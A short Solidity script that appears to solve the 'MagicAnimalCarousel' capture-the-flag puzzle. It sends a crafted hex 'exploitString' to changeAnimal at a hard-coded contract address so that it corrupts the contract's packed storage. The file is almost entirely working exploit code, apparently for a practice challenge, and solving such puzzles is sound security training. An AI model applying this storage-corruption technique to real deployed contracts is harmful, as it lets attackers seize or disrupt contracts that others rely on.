// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {MagicAnimalCarousel} from "cour_lvl.sol";

contract MagicAnimalCarouselScript {
    MagicAnimalCarousel carousel;

    function run() external {
        carousel = MagicAnimalCarousel(0xa9087930203af8698F7B337274F01e5498302513);
        carousel.setAnimalAndSpin("Dog");
        string memory exploitString = string(abi.encodePacked(hex"10000000000000000000FFFF"));
        carousel.changeAnimal(exploitString, 1);
        carousel.setAnimalAndSpin("Parrot");
    }
}